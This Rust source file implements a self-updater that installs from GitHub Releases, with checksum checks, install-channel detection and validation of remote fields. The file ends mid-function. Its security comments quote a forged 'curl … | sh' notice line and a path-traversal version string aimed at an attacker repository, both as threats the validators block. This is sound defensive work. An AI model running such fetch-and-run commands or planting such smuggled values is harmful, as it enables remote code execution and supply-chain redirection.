//! `cermet update` — ask this project's GitHub Releases what is published, and install it.
//!
//! ONE SOURCE, AND IT IS GITHUB. The whole update path is the GitHub release of [`UPDATE_REPO`]:
//! the tag names the version, the release's own `SHA256SUMS` asset carries the checksums, and the
//! artifact is one of that release's assets. There is no second host to reconcile against, and
//! there is nothing left to reconcile — a cross-check existed only to keep a cermet.dev-published
//! manifest honest, and cermet.dev is out of this path entirely.
//!
//! That is also the industry-standard posture and the honest one: GitHub Releases is the SAME
//! trust root the box was installed from (`dist/get-cermet.sh` fetches release assets), so an
//! update introduces no host the operator was not already trusting.
//!
//! EXPLICIT INSTALLATION ONLY. Nothing here installs
//! anything except when the operator types `cermet update`: there is no automatic install and no
//! version probe attached to another command. What DOES run on a schedule is the sibling module
//! [`crate::update_check`] — a daily CHECK that makes the same parameterless GETs, records a LOCAL
//! notice, and installs nothing. It runs as the operator, never as the daemon, and reuses this
//! module's fetch and parse seams rather than owning a second copy of them.
//!
//! The fetch happens in the CLI, not the daemon. `cermet update` carries no credential, reads no
//! vault, and asks the daemon nothing — it has exactly the trust of the `curl` an operator would
//! otherwise type, which is what `dist/get-cermet.sh` already is. Routing it through a ctl call
//! would instead give the process that holds every credential egress to github.com, and a broker
//! that fetches its own replacement is doing something that is neither authorization nor receipt.
//!
//! Integrity, stated honestly: the checksum comes from the same release as the artifact, so it
//! proves the bytes arrived intact and match what the release publishes, and NOTHING about who
//! authored them. Every surface here says that and reaches for no stronger word. Artifact signing
//! is a separate, unbuilt decision.
//!
//! ONE CHANNEL PER BOX. `cermet update` installs through the door the box was installed by: a
//! dpkg-managed box gets the `.deb` applied with `dpkg -i`, everything else gets the tarball
//! published through `cermet setup`. It never side-loads the other channel's
//! artifact. That is not a nicety — publishing a tarball into `/usr/local/bin` on a packaged box
//! leaves TWO cermets, and `setup`'s package-first source rule then republishes the
//! older `/usr/bin` copy over the newer one on the next `setup` run. Respecting the channel
//! dissolves that collision instead of arbitrating it, and leaves the package manager the
//! authority it already claims.
//!
//! DELEGATE, DON'T ACT, WHERE ANOTHER ECOSYSTEM OWNS THE INSTALL: package-manager installs should
//! stay package-manager-managed, and this command must never overwrite files belonging to Homebrew
//! or Cargo behind their backs. A cargo-installed cermet runs out of `~/.cargo/bin`, and a Homebrew
//! one out of a Cellar; both ecosystems own their bytes and ship their own trust and update
//! mechanism. So [`run`] reads the ecosystem off the RUNNING executable's resolved location BEFORE
//! anything else, and where one owns it prints that ecosystem's own commands and exits 0 having
//! touched nothing and contacted no origin — under `--check` too. Doing otherwise would publish a
//! tarball into `/usr/local/bin` beside cargo's copy: the same two-cermets shadowing the dpkg
//! channel rule above dissolves, entered by another door.
//!
//! The hand-off is TWO steps, because the two halves of an install have different owners. The
//! package channel delivers the bytes (`cargo install`, `brew upgrade`); the SYSTEM install — the
//! root-owned published copy the daemon executes, the service units, the custody layout — is
//! converged by `cermet setup`, which is Cermet's regardless of who delivered the binary. An
//! upgrade that stops after the first step leaves the daemon running the old published copy, so
//! both lines are printed and both are load-bearing.
//!
//! Publication is not reimplemented. Once the download verifies, the STAGED (new) binary runs its
//! own `cermet setup` convergence with itself as the explicit source — the same code path
//! `dpkg -i` and `get-cermet.sh` already drive, which owns the converged-layout no-op, the
//! stop-before-publish ordering, the atomic rename, and the daemon restart. A release can change
//! the unit file, the tmpfiles rule, or the catalog, all of which ship inside the binary as its
//! embedded payload, so publishing only the executable would leave an install half-upgraded.

use std::collections::BTreeMap;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use serde::Deserialize;
use sha2::{Digest, Sha256};

use crate::{CliError, CliOutput};

/// The repository whose GitHub Releases ARE the update channel.
///
/// **There is deliberately no environment override for the SLUG.** [`ORIGIN_ENV`] redirects the
/// HOST a fixture is served from — a declared, documented test door — but which project's releases
/// are believed is a compile-time fact. A settable slug would let a steered model running as the
/// operator's own uid (T1) point the updater at a repository it controls without ever touching a
/// file root can see. Changing it is a rebuild.
///
/// It is the same repository `dist/get-cermet.sh` fetches the FIRST install from, which is the
/// point: an update introduces no host the operator was not already trusting.
pub const UPDATE_REPO: &str = "suarezc/cermet";

/// Where `releases/latest` is answered. One parameterless, tokenless, unauthenticated GET.
pub const DEFAULT_API_BASE: &str = "https://api.github.com";

/// Where a release's assets are downloaded from. `github.com` answers an asset URL with a 302 to
/// `release-assets.githubusercontent.com`, which the HTTP client follows.
pub const DEFAULT_DOWNLOAD_BASE: &str = "https://github.com";

/// The declared origin override. `http(s)://…` or `file://…`, and it remaps BOTH halves of the
/// contact — the API base and the download base — so a `file://` fixture tree that mimics
/// `repos/<slug>/releases/latest`, the release's `SHA256SUMS`, and its artifact assets exercises
/// the WHOLE flow with no network. That is what the container upgrade leg drives.
///
/// **Recorded honestly.** With the cross-check gone, an env-steered origin
/// is single-source self-vouching again: whoever sets it serves the version, the checksums and the
/// bytes. That is the posture every package manager has, it is the accepted trade for a
/// testable update path, and it is bounded by the two things that did not change — both apply paths
/// still require the operator's own sudo, and the consent paragraph always prints the URL it is
/// about to install from, so a redirected origin is visible to the human answering the prompt. It
/// is a setting, not a hidden path: `cermet update --help` names it.
pub const ORIGIN_ENV: &str = "CERMET_UPDATE_ORIGIN";

/// The two hosts one release lives across, resolved once per run.
///
/// GitHub answers the release METADATA on `api.github.com` and serves the release ASSETS from
/// `github.com`; a `file://` fixture answers both out of one tree. Keeping them as one resolved
/// value is what makes the override a single setting rather than two that could disagree.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Origin {
    pub api: String,
    pub download: String,
}

impl Origin {
    /// The release the project publishes as latest. Parameterless: no token, no query, no body.
    pub fn release_url(&self, repo: &str) -> String {
        format!(
            "{}/repos/{repo}/releases/latest",
            self.api.trim_end_matches('/')
        )
    }

    /// One asset of the release tagged `v<version>`, CONSTRUCTED from the vendored slug and the
    /// validated version — never taken from a URL field of the response.
    pub fn asset_url(&self, repo: &str, version: &str, file: &str) -> String {
        format!(
            "{}/{repo}/releases/download/v{version}/{file}",
            self.download.trim_end_matches('/')
        )
    }

    /// The human-readable page for one release: what the notice prints as "where to read about it".
    pub fn release_page(&self, repo: &str, version: &str) -> String {
        format!(
            "{}/{repo}/releases/tag/v{version}",
            self.download.trim_end_matches('/')
        )
    }

    /// What every operator-facing surface calls "the origin".
    pub fn label(&self, repo: &str) -> String {
        format!("{}/{repo}/releases", self.download.trim_end_matches('/'))
    }
}

/// Resolve the origin: the declared override when it carries a value, GitHub otherwise. An EMPTY
/// override is not an override — an unset-looking environment variable must never become an
/// unreachable origin.
pub fn origin(override_value: Option<String>) -> Origin {
    match override_value {
        Some(value) if !value.trim().is_empty() => {
            let base = value.trim().to_string();
            Origin {
                api: base.clone(),
                download: base,
            }
        }
        _ => Origin {
            api: DEFAULT_API_BASE.to_string(),
            download: DEFAULT_DOWNLOAD_BASE.to_string(),
        },
    }
}

/// How the artifact this run would install was VERIFIED. Recorded and printed rather than assumed:
/// a surface that does not say what it checked is asserting something by silence.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verification {
    /// The version, the checksums and the artifact all came from one GitHub release.
    GithubRelease,
    /// There was nothing to install, so no checksum was resolved at all.
    NoArtifact,
}

impl Verification {
    /// The ONE word every surface uses: `cermet update --check`, the `cermet check` row, and the
    /// recorded check state all print the same one.
    pub fn word(&self) -> &'static str {
        match self {
            Verification::GithubRelease => "github-release",
            Verification::NoArtifact => "no-artifact",
        }
    }

    /// The honesty line: the word plus what it actually establishes.
    pub fn line(&self) -> String {
        match self {
            Verification::GithubRelease => "verification: github-release — version, checksums, and \
                                            artifact all come from the GitHub release; the checksum \
                                            proves the download is intact and matches what the \
                                            release publishes, not who authored it."
                .to_string(),
            Verification::NoArtifact => "verification: no-artifact — there is nothing to install, \
                                         so no checksum was resolved."
                .to_string(),
        }
    }
}

/// Read a `SHA256SUMS` file into `filename → sha256`.
///
/// Coreutils' own format, both spellings: `<sha>  <name>` and `<sha> *<name>`. A line that is not a
/// checksum line is skipped rather than refused — a real SHA256SUMS may carry a header — but a
/// document with no checksum lines at all is refused, because an HTML error page served with 200 is
/// the commonest shape of "this release has no such asset" and must never read as a checksum.
pub fn parse_sha256sums(body: &str) -> Result<BTreeMap<String, String>, String> {
    let mut sums = BTreeMap::new();
    for line in body.lines() {
        let Some((sum, name)) = line.split_once(char::is_whitespace) else {
            continue;
        };
        if sum.len() != 64
            || !sum
                .bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
        {
            continue;
        }
        let name = name.trim_start().trim_start_matches('*').trim();
        if name.is_empty() {
            continue;
        }
        sums.insert(name.to_string(), sum.to_string());
    }
    if sums.is_empty() {
        return Err("it published no checksum lines at all".to_string());
    }
    Ok(sums)
}

/// One published artifact: the bare asset filename, and its sha256 as the release's own
/// `SHA256SUMS` publishes it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Artifact {
    pub file: String,
    pub sha256: String,
}

/// The GitHub release this project publishes as latest, reduced to the four facts the updater uses.
///
/// Nothing else of the response survives parsing, and that is the T1 defense rather than an
/// economy: a release body is remote content authored by whoever can publish a release, so it is
/// read for exactly ONE BIT — the [`Release::security`] marker — and then dropped. No body text,
/// no response-supplied URL, and no asset name outside [`validate_artifact_file`] ever reaches a
/// terminal, a state file, or a request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Release {
    /// `tag_name` with its leading `v` stripped, through [`validate_version`].
    pub version: String,
    /// Does this release correct a security defect? It changes only what the LOCAL notice SAYS —
    /// nothing installs itself either way.
    pub security: bool,
    /// Where to read about it: the release page, CONSTRUCTED from the vendored slug and the
    /// validated tag. `None` where the constructed url is not one the notice may print.
    pub notes: Option<String>,
    /// The asset filenames this release publishes, each a bare filename.
    pub assets: Vec<String>,
}

/// The door this box was installed through, and therefore the only one an update may use.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Channel {
    /// dpkg owns the installed cermet. Updates are packages, applied by dpkg.
    Deb,
    /// A tarball or a source install. Updates are tarballs, published by `cermet setup`.
    Tarball,
}

impl Channel {
    fn noun(&self) -> &'static str {
        match self {
            Channel::Deb => "package",
            Channel::Tarball => "tarball",
        }
    }
}

/// Where a package-managed cermet lives. The SAME path `setup::PACKAGED_BIN_DIR` resolves its
/// preferred publication source from — one fact about this box, read the same way in both places.
const PACKAGED_CERMET: &str = "/usr/bin/cermet";

/// A package ecosystem that owns the running executable and has its own trust and update mechanism.
///
/// Where one does, `cermet update` DELEGATES rather than acts: package-manager installs should
/// stay package-manager-managed, and this command must never overwrite files belonging to Homebrew
/// or Cargo behind their backs. The concrete failure it avoids is the same one the dpkg channel
/// rule above already dissolves: a cargo-installed cermet lives at `~/.cargo/bin/cermet`, so
/// publishing a tarball into `/usr/local/bin` would leave TWO cermets on the box with no rule
/// saying which wins — the same shadowing disease, entered through a different door.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Ecosystem {
    /// `cargo install cermet`, or `cargo install --path crates/cermet-bin` from a checkout.
    Cargo,
    /// A Homebrew formula. FORWARD-PROVISIONED: no formula exists yet, and this branch exists
    /// before one does so that no `brew install` ever meets a non-delegating updater.
    Homebrew,
}

impl Ecosystem {
    fn name(&self) -> &'static str {
        match self {
            Ecosystem::Cargo => "cargo",
            Ecosystem::Homebrew => "Homebrew",
        }
    }
}

/// An install that belongs to a package ecosystem: which one, and the STABLE path that ecosystem
/// keeps `cermet` at.
///
/// The path matters because the delegation's second step is a `setup` run and a bare `sudo cermet`
/// resolves against sudo's own PATH — which on Linux excludes `~/.cargo/bin` entirely and can land
/// on the older published copy instead, publishing it right back over itself. It is the ecosystem's
/// stable entry, not the resolved file: Homebrew's Cellar path carries the version and is gone the
/// moment `brew upgrade` finishes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Delegation {
    pub ecosystem: Ecosystem,
    pub entry: PathBuf,
}

/// The environment facts the ecosystem check reads, gathered once so the check itself stays a pure
/// function of (resolved path, environment) and every branch is drivable without a cargo or a brew.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct EcosystemEnv {
    pub cargo_home: Option<PathBuf>,
    pub home: Option<PathBuf>,
    pub homebrew_prefix: Option<PathBuf>,
}

impl EcosystemEnv {
    pub fn from_process() -> Self {
        Self {
            cargo_home: declared_dir("CARGO_HOME"),
            home: declared_dir("HOME"),
            homebrew_prefix: declared_dir("HOMEBREW_PREFIX"),
        }
    }
}

/// A declared directory: set, and not empty. An empty variable is not a declaration — the same rule
/// [`origin`] follows, and here it is what keeps `$CARGO_HOME=""` from naming `bin/`.
fn declared_dir(name: &str) -> Option<PathBuf> {
    std::env::var_os(name)
        .map(PathBuf::from)
        .filter(|value| !value.as_os_str().is_empty())
}

/// The Homebrew cellars that exist without being declared: Apple-silicon and Intel prefixes.
const HOMEBREW_CELLARS: [&str; 2] = ["/opt/homebrew/Cellar", "/usr/local/Cellar"];

/// Does a package ecosystem own the executable at `resolved`?
///
/// Read off the INSTALLED LOCATION, never off the environment alone: a box can have `~/.cargo/bin`
/// on its PATH and a Homebrew prefix present while the cermet that is RUNNING is the one Cermet
/// published into `/usr/local/bin` — which is Cermet's to update, through its own channel. The
/// caller resolves symlinks before asking, because Homebrew's `<prefix>/bin/cermet` is a symlink
/// into the Cellar and the question is where the file lives, not what name reached it.
pub fn classify_ecosystem(resolved: &Path, env: &EcosystemEnv) -> Option<Delegation> {
    // Cargo installs into `$CARGO_HOME/bin`; `~/.cargo/bin` is its default and stays cargo's
    // territory even when $CARGO_HOME now points elsewhere — nothing else writes there.
    let cargo_bins = [
        env.cargo_home.as_ref().map(|home| home.join("bin")),
        env.home.as_ref().map(|home| home.join(".cargo/bin")),
    ];
    for bin in cargo_bins.into_iter().flatten() {
        if resolved.starts_with(&bin) {
            return Some(Delegation {
                ecosystem: Ecosystem::Cargo,
                entry: bin.join("cermet"),
            });
        }
    }
    // Only the Cellar holds a formula's files. A `<prefix>/bin/cermet` that resolves to something
    // outside the Cellar is somebody's own copy sitting in Homebrew's bin directory, not a formula.
    let cellars = HOMEBREW_CELLARS
        .iter()
        .map(PathBuf::from)
        .chain(env.homebrew_prefix.iter().map(|p| p.join("Cellar")));
    for cellar in cellars {
        if resolved.starts_with(&cellar) {
            let prefix = cellar.parent().unwrap_or(Path::new("/"));
            return Some(Delegation {
                ecosystem: Ecosystem::Homebrew,
                entry: prefix.join("bin/cermet"),
            });
        }
    }
    None
}

/// A second cermet on this box: the first candidate that exists and is NOT the file now running.
///
/// It is reported, never resolved. Choosing one of two installs to overwrite is exactly the
/// behind-the-back write the delegation exists to avoid, so the operator gets the fact and makes
/// the call. Candidates are compared canonically, so a published path that is merely a link to the
/// running file is one install rather than two.
fn coexisting_install(resolved: &Path, candidates: &[PathBuf]) -> Option<PathBuf> {
    candidates
        .iter()
        .find(|candidate| match std::fs::canonicalize(candidate) {
            Ok(actual) => actual != resolved,
            Err(_) => false,
        })
        .cloned()
}

/// Read the delegation off THIS box, or `None` when this install is Cermet's own to update.
fn host_delegation() -> Option<String> {
    let running = std::env::current_exe().ok()?;
    let resolved = std::fs::canonicalize(&running).unwrap_or(running);
    let delegation = classify_ecosystem(&resolved, &EcosystemEnv::from_process())?;
    let candidates = [
        PathBuf::from(crate::setup::INSTALL_BIN_DIR).join("cermet"),
        PathBuf::from(PACKAGED_CERMET),
    ];
    Some(render_delegation(
        &delegation,
        coexisting_install(&resolved, &candidates).as_deref(),
    ))
}

/// Hand the update back to the ecosystem that owns it, in two steps.
///
/// The package channel delivers BYTES; the SYSTEM install — the root-owned published copy the
/// daemon runs, the service units, the custody layout — is converged by `cermet setup`. So a
/// channel upgrade alone leaves the running daemon on the old published binary, and both lines are
/// load-bearing. `setup` republishes on a byte-for-byte content difference against the source
/// binary (`setup::published_binary_is_current`), so the second step is a no-op on an already
/// converged box and a full republish-and-restart after a real upgrade.
pub fn render_delegation(delegation: &Delegation, other: Option<&Path>) -> String {
    let run = match delegation.ecosystem {
        Ecosystem::Cargo => "run: cargo install --locked cermet   (or, from a source checkout: \
                             cargo install --locked --path crates/cermet-bin)"
            .to_string(),
        Ecosystem::Homebrew => "run: brew upgrade cermet".to_string(),
    };
    let mut text = format!(
        "installed via {}\n{run}\nthen: sudo {} setup   (republishes the system install from the \
         new binary)",
        delegation.ecosystem.name(),
        delegation.entry.display()
    );
    if let Some(other) = other {
        text.push_str(&format!(
            "\nalso installed: {} — a second cermet on this box, which this command does not touch.",
            other.display()
        ));
    }
    text
}

/// Decide the channel from two facts about the box: is there a cermet at the packaged path, and
/// does dpkg own it (`None` when there is no dpkg to ask).
///
/// Fails closed on the unclear case. A cermet sitting at `/usr/bin/cermet` that no package manager
/// owns still WINS: `setup` prefers that copy as its publication source, so an update that
/// published a tarball beside it would be overwritten by the next `setup` run. Refusing names the
/// file and leaves the box alone, which is the honest answer to "I cannot tell which channel this
/// is" — never a guess that silently creates a second one.
pub fn classify_channel(packaged_exists: bool, dpkg_owns: Option<bool>) -> Result<Channel, String> {
    if !packaged_exists {
        return Ok(Channel::Tarball);
    }
    match dpkg_owns {
        Some(true) => Ok(Channel::Deb),
        Some(false) => Err(format!(
            "there is a cermet at {PACKAGED_CERMET} that no package owns. `cermet setup` prefers              that copy over anything update could publish, so installing beside it would leave two              cermets disagreeing. Remove it, or reinstall from the package. nothing was published."
        )),
        None => Err(format!(
            "there is a cermet at {PACKAGED_CERMET} and no dpkg on this box to say what owns it.              `cermet setup` prefers that copy over anything update could publish, so installing              beside it would leave two cermets disagreeing. nothing was published."
        )),
    }
}

/// WHICH DOOR this install came through, as one closed ordinal — the distribution fact, gathered
/// from exactly the two checks `cermet update` already performs to decide what it may publish.
///
/// It learns nothing new about the box: [`classify_ecosystem`] and [`classify_channel`] are the
/// whole of the derivation, and both already run on every `cermet update`. A path is inspected,
/// dpkg is asked one question, and the answer is one of four words.
///
/// `Ecosystem` collapses cargo and Homebrew deliberately: the fact worth having is "another package
/// ecosystem owns this install", and which one is a finer cut than the question needs.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallChannel {
    /// dpkg owns the installed cermet.
    Deb,
    /// A tarball or source install Cermet publishes itself.
    Tarball,
    /// Another package ecosystem owns it — cargo or Homebrew.
    Ecosystem,
    /// The box does not say. A cermet at the packaged path that no package owns, no dpkg to ask, or
    /// no readable running executable: the honest answer, never a guess at one of the other three.
    #[default]
    Unknown,
}

/// The pure half: which door, given what the two existing checks found. An ecosystem-owned install
/// answers `ecosystem` whatever the packaged path holds — that is the same precedence `run` applies
/// when it delegates before consulting the channel at all.
pub fn classify_install_channel(
    ecosystem: Option<Ecosystem>,
    channel: Option<Channel>,
) -> InstallChannel {
    match (ecosystem, channel) {
        (Some(_), _) => InstallChannel::Ecosystem,
        (None, Some(Channel::Deb)) => InstallChannel::Deb,
        (None, Some(Channel::Tarball)) => InstallChannel::Tarball,
        (None, None) => InstallChannel::Unknown,
    }
}

/// Read the install channel off THIS box, through the same two checks `cermet update` uses. Never
/// fails: an unanswerable box is [`InstallChannel::Unknown`].
pub fn host_install_channel() -> InstallChannel {
    let ecosystem = std::env::current_exe()
        .ok()
        .map(|running| std::fs::canonicalize(&running).unwrap_or(running))
        .and_then(|resolved| classify_ecosystem(&resolved, &EcosystemEnv::from_process()))
        .map(|delegation| delegation.ecosystem);
    classify_install_channel(ecosystem, host_channel().ok())
}

/// Read the channel off THIS box.
pub fn host_channel() -> Result<Channel, String> {
    let packaged = Path::new(PACKAGED_CERMET);
    let exists = std::fs::symlink_metadata(packaged).is_ok();
    let owns = if exists { dpkg_owns(packaged) } else { None };
    classify_channel(exists, owns)
}

/// Does dpkg claim `path`? `None` when there is no dpkg to ask — never `Some(false)`, because
/// "I could not ask" and "I asked and it said no" are different facts with different answers.
fn dpkg_owns(path: &Path) -> Option<bool> {
    let output = std::process::Command::new("dpkg")
        .arg("-S")
        .arg(path)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .ok()?;
    Some(output.success())
}

/// What the origin's answer means for THIS installation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Plan {
    /// The origin publishes the version already installed.
    UpToDate { version: String },
    /// There is something to install for this platform, through this box's channel. The CHECKSUM
    /// is not here: it is resolved from the release's `SHA256SUMS` only once a plan is installable,
    /// so an up-to-date box makes one request a day rather than two.
    Available {
        current: String,
        version: String,
        target: String,
        channel: Channel,
        file: String,
    },
    /// The release publishes a version, but nothing this platform + channel can install. Also the
    /// answer for a platform with no artifact at all — the state is the same and so is the remedy.
    NoArtifactForTarget {
        version: String,
        target: String,
        channel: Channel,
    },
}

/// The result of asking the origin for a document.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Fetched {
    /// The origin answered, and the document is not there. For `releases/latest` this is the
    /// no-channel state — a fact about the project, not a failure of the command.
    Missing,
    Body(Vec<u8>),
}

/// Exactly the fields of GitHub's release JSON this build reads. Everything else in that document —
/// including every URL field — is ignored by construction rather than by discipline.
#[derive(Deserialize)]
struct ReleaseJson {
    tag_name: String,
    #[serde(default)]
    body: Option<String>,
    #[serde(default)]
    assets: Vec<ReleaseAssetJson>,
}

#[derive(Deserialize)]
struct ReleaseAssetJson {
    name: String,
}

/// The marker that escalates the daily-check notice: a release whose BODY's first line starts with
/// this corrects a security defect.
///
/// A marker rather than a field, because GitHub's release object has no "this is a security
/// release" bit and inventing a side-channel document to carry one would be exactly the
/// Cermet-owned mechanism the authorization-and-receipt ruling forbids. The body is the release
/// author's own text, it is where a human already reads the advisory, and one convention over its
/// first line costs nothing.
pub const SECURITY_MARKER: &str = "SECURITY:";

/// Parse and VALIDATE one release document.
///
/// The response is remote content (T1) and every field it carries is treated as such:
///
/// * `tag_name` becomes the version, through [`validate_version`] — the one seam that gates it,
///   because the version is printed verbatim by every later surface and interpolated into every
///   asset URL;
/// * `body` is read for ONE BIT (does its first line start with [`SECURITY_MARKER`]) and then
///   dropped. No byte of it is stored or printed, so a body full of ANSI and newlines has nowhere
///   to forge a line;
/// * `assets` yields bare filenames and nothing else; a name that is not one ([`validate_artifact_file`])
///   is skipped, since the artifact this box wants is named by CONVENTION and a malformed name can
///   therefore never be selected;
/// * every URL field of the response is ignored. The notes url is CONSTRUCTED from the vendored
///   slug and the validated version, and then passes [`validate_notes_url`] anyway — the same door
///   a response-supplied url would have to pass, so a future change that trusted one could not
///   bypass it.
pub fn parse_release(body: &str, origin: &Origin, repo: &str) -> Result<Release, String> {
    let release: ReleaseJson = serde_json::from_str(body)
        .map_err(|error| format!("the release document is not readable: {error}"))?;
    let version = release
        .tag_name
        .strip_prefix('v')
        .unwrap_or(&release.tag_name)
        .to_string();
    validate_version(&version)
        .map_err(|why| format!("the release names no usable version: {why}"))?;
    let security = release
        .body
        .as_deref()
        .and_then(|body| body.lines().next())
        .map(|first| first.trim_start().starts_with(SECURITY_MARKER))
        .unwrap_or(false);
    let notes = origin.release_page(repo, &version);
    let notes = validate_notes_url(&notes).ok().map(|()| notes);
    let assets = release
        .assets
        .into_iter()
        .map(|asset| asset.name)
        .filter(|name| validate_artifact_file(name).is_ok())
        .collect::<Vec<_>>();
    if assets.is_empty() {
        return Err(format!("the {version} release publishes no usable asset"));
    }
    Ok(Release {
        version,
        security,
        notes,
        assets,
    })
}

/// A published artifact is a BARE FILENAME in the release's asset list — never a path, never a URL.
fn validate_artifact_file(file: &str) -> Result<(), String> {
    if file.is_empty() {
        return Err("it is empty".into());
    }
    if file.contains('/') || file.contains('\\') || file.contains(':') {
        return Err(format!("{file:?} is a path or a URL, not a filename"));
    }
    if file == "." || file == ".." || file.starts_with('.') {
        return Err(format!("{file:?} is not an artifact name"));
    }
    Ok(())
}

/// The version is the release's most far-reaching field, and this is the ONE seam that validates it
/// (U1+U2, review 2026-08-17). Two reach paths, one charset check:
///
/// * it is PRINTED verbatim by every surface downstream — the one-line notice, the `cermet check`
///   row, the recorded `problem` string, `render_plan` — so a control byte forges a line under
///   Cermet's own prefix. Worse than the `notes` case, because the version is written to the state
///   file and re-printed on every command until the operator updates;
/// * it is INTERPOLATED into every asset URL and into the release page url, where `..` segments
///   normalize away and a version like `0.1.1/../../attacker/repo/...` would let the response
///   choose which repository's bytes are downloaded — voiding the vendored-slug property outright.
///
/// Adversary: T1 through `CERMET_UPDATE_ORIGIN`, or a compromised release document. Validating HERE
/// rather than at each surface is what makes the coverage a property of the type: nothing
/// downstream ever holds a [`Release`] that did not come through [`parse_release`], so the notice,
/// the row, the problem string and every URL are covered by this one check and cannot drift apart.
///
/// The charset is semver's own — digits, letters, `.`, `-`, `+` — which admits every version a
/// release could carry (`1.0.0-rc.1`, `0.2.0+build.5`) and no path separator, no whitespace, no
/// control byte, no percent-escape, and nothing non-ASCII.
fn validate_version(version: &str) -> Result<(), String> {
    if version.is_empty() {
        return Err("it is empty".into());
    }
    if version.len() > 64 {
        return Err("it is longer than 64 characters".into());
    }
    if let Some(bad) = version
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+')))
    {
        return Err(format!(
            "{version:?} carries {bad:?}, which is not a version character (digits, letters, and              `.` `-` `+` only)"
        ));
    }
    Ok(())
}

/// The notes url is PRINTED into a terminal notice, so it is content on its way to the operator's
/// screen (T1). One embedded newline would forge a second line under Cermet's own prefix —
/// "SECURITY UPDATE: run curl … | sh" — which is a real defect for one cheap check, not a
/// hypothetical. `https` only, ASCII, no whitespace, bounded.
///
/// The url this build prints is CONSTRUCTED (slug + validated version), so this is the door that
/// construction has to pass too — and the door a response-supplied url would have to pass, if one
/// were ever read. A `file://` fixture origin therefore simply publishes no notes url.
fn validate_notes_url(notes: &str) -> Result<(), String> {
    if !notes.starts_with("https://") {
        return Err(format!("{notes:?} is not an https url"));
    }
    if notes.len() > 200 {
        return Err("it is longer than 200 characters".into());
    }
    if notes
        .chars()
        .any(|c| !c.is_ascii() || c.is_ascii_whitespace() || c.is_ascii_control())
    {
        return Err(format!(
            "{notes:?} carries whitespace or a non-printable character"
        ));
    }
    Ok(())
}

/// This platform's target key, in the SAME table `dist/get-cermet.sh` resolves — one naming
/// convention for the first install and every later one. `None` where no release is published.
pub fn resolve_target(os: &str, arch: &str) -> Option<&'static str> {
    match (os, arch) {
        ("linux", "x86_64") => Some("linux_amd64"),
        ("linux", "aarch64") => Some("linux_arm64"),
        ("macos", "aarch64") => Some("darwin_arm64"),
        _ => None,
    }
}

pub fn host_target() -> Option<&'static str> {
    resolve_target(std::env::consts::OS, std::env::consts::ARCH)
}

/// The version this build reports to the origin comparison. The workspace version, not
/// [`cermet_ipc::BUILD_ID`]: the origin publishes releases, and a release is what a version names.
pub const CURRENT_VERSION: &str = env!("CARGO_PKG_VERSION");

/// The asset filename a release publishes for one target and one channel, by the SAME naming
/// convention `dist/Makefile` builds them under and `dist/get-cermet.sh` fetches them by.
///
/// Convention rather than a declared table, because the release IS the table now: a name is
/// computed here and then required to be an actual asset of the release, so a target that
/// published nothing simply has no match. A `.deb` carries only its Debian arch
/// (`cermet_<ver>_amd64.deb`), which is why the deb channel is Linux-only by construction — a
/// packaged box on a platform that ships no package has nothing to install, and must never be
/// handed the tarball instead.
pub fn artifact_name(version: &str, target: &str, channel: Channel) -> Option<String> {
    match channel {
        Channel::Tarball => Some(format!("cermet_{version}_{target}.tar.gz")),
        Channel::Deb => target
            .strip_prefix("linux_")
            .map(|arch| format!("cermet_{version}_{arch}.deb")),
    }
}

/// What the release means for this installation.
///
/// EQUALITY, not ordering. The project is authoritative on what "latest" means, so the CLI computes
/// no semver ordering and therefore holds no opinion about prereleases, build metadata, or a
/// deliberate downgrade — different means there is something to install.
pub fn plan(current: &str, release: &Release, target: Option<&str>, channel: Channel) -> Plan {
    if release.version == current {
        return Plan::UpToDate {
            version: release.version.clone(),
        };
    }
    let target = target.unwrap_or("this platform");
    match artifact_name(&release.version, target, channel)
        .filter(|file| release.assets.iter().any(|asset| asset == file))
    {
        Some(file) => Plan::Available {
            current: current.to_string(),
            version: release.version.clone(),
            target: target.to_string(),
            channel,
            file,
        },
        None => Plan::NoArtifactForTarget {
            version: release.version.clone(),
            target: target.to_string(),
            channel,
        },
    }
}

/// The sha256 of some bytes, lowercase hex.
pub fn sha256_hex(bytes: &[u8]) -> String {
    let digest = Sha256::digest(bytes);
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

pub fn sha256_file(path: &Path) -> Result<String, String> {
    let bytes =
        std::fs::read(path).map_err(|error| format!("cannot read {}: {error}", path.display()))?;
    Ok(sha256_hex(&bytes))
}

/// Refuse anything whose digest is not the one the origin published, in the words the operator
/// reads. A partial download and a swapped artifact are the same fact here, and the same answer:
/// nothing is published and the installed binary is untouched.
pub fn verify_bytes(file: &str, bytes: &[u8], expected: &str) -> Result<(), String> {
    let got = sha256_hex(bytes);
    if got == expected {
        return Ok(());
    }
    Err(format!(
        "{file} does not match the checksum the release published.\n  \
         expected {expected}\n  got      {got}\n\
         nothing was published; the installed binary is untouched."
    ))
}

/// Assert the unpacked artifact is the ONE-BINARY payload the release ships — one regular
/// executable `cermet`, with `cermetd` and `git-remote-cermet` as symlinks whose target is exactly
/// the relative name `cermet`. Returns the binary to publish.
///
/// These are the assertions `dist/get-cermet.sh` already makes on the same tarball, for the same
/// reason: a link that escapes its own directory would have the publish step point at, or write,
/// something the origin did not ship.
pub fn verify_payload_layout(dir: &Path) -> Result<PathBuf, String> {
    let binary = dir.join("cermet");
    let metadata = std::fs::symlink_metadata(&binary)
        .map_err(|_| "the artifact carries no cermet executable".to_string())?;
    if metadata.file_type().is_symlink() || !metadata.is_file() {
